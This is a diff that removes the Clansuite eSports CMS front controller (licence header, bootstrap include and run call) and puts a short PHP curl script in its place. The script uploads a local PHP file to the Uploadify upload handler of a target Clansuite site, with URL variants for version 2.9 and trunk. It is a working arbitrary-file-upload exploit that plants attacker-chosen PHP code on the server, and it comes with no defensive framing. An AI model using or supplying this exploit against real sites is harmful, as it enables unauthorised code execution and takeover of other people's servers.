@@ -1,46 +1,13 @@
 <?php
-   /**
-    * Clansuite - just an eSports CMS
-    * Jens-André Koch © 2005 - onwards
-    * http://www.clansuite.com/
-    *
-    *        _\|/_
-    *        (o o)
-    +-----oOO-{_}-OOo------------------------------------------------------------------+
-    |                                                                                  |
-    |    LICENSE                                                                       |
-    |                                                                                  |
-    |    This program is free software; you can redistribute it and/or modify          |
-    |    it under the terms of the GNU General Public License as published by          |
-    |    the Free Software Foundation; either version 2 of the License, or             |
-    |    (at your option) any later version.                                           |
-    |                                                                                  |
-    |    This program is distributed in the hope that it will be useful,               |
-    |    but WITHOUT ANY WARRANTY; without even the implied warranty of                |
-    |    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                 |
-    |    GNU General Public License for more details.                                  |
-    |                                                                                  |
-    |    You should have received a copy of the GNU General Public License             |
-    |    along with this program; if not, write to the Free Software                   |
-    |    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA    |
-    |                                                                                  |
-    +----------------------------------------------------------------------------------+
-    *
-    * @license    GNU/GPL v2 or (at your option) any later version, see "/doc/LICENSE".
-    * @author     Jens-André Koch <vain@clansuite.com>
-    * @copyright  Copyleft: All rights reserved. Jens-André Koch (2005 - onwards)
-    * @link       http://www.clansuite.com
-    * @version    SVN: $Id$
-    */
-
-# define Clansuite Security Constant
-define('IN_CS', true);
-
-# require application bootstrap
-require 'core/bootstrap/clansuite.application.php';
-
-/**
- * Take off.
- */
-Clansuite_CMS::run();
+$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\info.php";
+$c = curl_init("http://mysite.com/uploads/uploadify.php"); // Version 2.9
+$c = curl_init("http://mysite.com/application/uploads/uploadify.php"); // Version trunk
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('Filedata'=>"@$u",
+'name'=>"info.php"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
 ?>
